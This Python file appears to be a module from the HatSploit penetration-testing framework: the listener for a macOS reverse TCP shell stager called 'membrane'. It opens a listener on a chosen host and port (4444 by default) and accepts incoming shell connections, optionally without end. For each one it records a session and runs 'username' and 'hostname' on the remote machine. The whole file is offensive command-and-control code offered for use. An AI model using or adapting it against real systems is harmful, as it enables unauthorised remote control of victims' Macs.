#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.cli.badges import badges
from utils.helper import helper
from core.cli.parser import parser
from core.base.sessions import sessions

from data.modules.exploit.macos.stager.membrane_reverse_tcp.core.listener import listener

class HatSploitModule:
    def __init__(self):
        self.badges = badges()
        self.helper = helper()
        self.parser = parser()
        self.sessions = sessions()
        
        self.listener = listener()

        self.session = None
        self.id_number = 0
        
        self.details = {
            'Name': "exploit/macos/stager/membrane_reverse_tcp",
            'Authors': [
                'enty8080'
            ],
            'Description': "macOS reverse TCP shell with full remote functionality.",
            'Dependencies': [
                ''
            ],
            'Comments': [
                ''
            ],
            'Risk': "high"
        }
        
        self.options = {
            'LHOST': {
                'Description': "Local host.",
                'Value': self.helper.getip(),
                'Required': True
            },
            'LPORT': {
                'Description': "Local port.",
                'Value': 4444,
                'Required': True
            },
            'FOREVER': {
                'Description': "Start listener forever.",
                'Value': "no",
                'Required': False
            }
        }
            
    def add_session(self, session, local_port, address):
        username = session.send_command("username")[1]
        hostname = session.send_command("hostname")[1]
        
        self.sessions.add_session("macos/membrane", self.id_number, address, local_port,
                                 username, hostname, session, session.send_command, session.close)
        self.badges.output_success("Session " + str(self.id_number) + " opened!")
        self.id_number += 1
            
    def start_listener(self, forever, local_host, local_port):
        self.badges.output_process("Starting listener on port " + local_port + "...")
        try:
            server = self.listener.start_listener(local_host, local_port)
        except Exception:
            return
        
        if forever.lower() in ['yes', 'y']:
            while True:
                try:
                    session, address = self.listener.listen(local_host, local_port, server)
                except Exception:
                    return
                if session:
                    self.add_session(session, local_port, address)
        else:
            try:
                session, address = self.listener.listen(local_host, local_port, server)
            except Exception:
                return
            if session:
                self.add_session(session, local_port, address)

    def run(self):
        local_host, local_port, forever = self.parser.parse_options(self.options)
        self.start_listener(forever, local_host, local_port)
